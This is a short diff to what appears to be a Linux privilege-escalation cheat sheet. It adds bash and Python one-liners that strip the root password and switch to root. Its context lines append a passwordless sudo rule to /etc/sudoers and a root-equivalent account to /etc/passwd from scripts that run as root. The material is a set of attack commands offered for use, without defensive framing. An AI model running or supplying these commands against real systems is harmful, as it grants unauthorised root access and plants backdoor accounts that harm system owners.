@@ -85,6 +85,16 @@ networking
 `ps –ef
 `ps –ef | grep root
 
+**Script that deletes the root password**
+bash:
+`passwd -d root`
+`su root`
+python:
+`import os;os.system(\"passwd -d root\")`
+or
+`echo "import os;os.system(\"passwd -d root\")" > bash.py`
+
+
 **Scripts that can be used if they run as root:
 `echo “user ALL=(ALL) NOPASSWD:ALL” >> /etc/sudoers
 `echo “user::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd
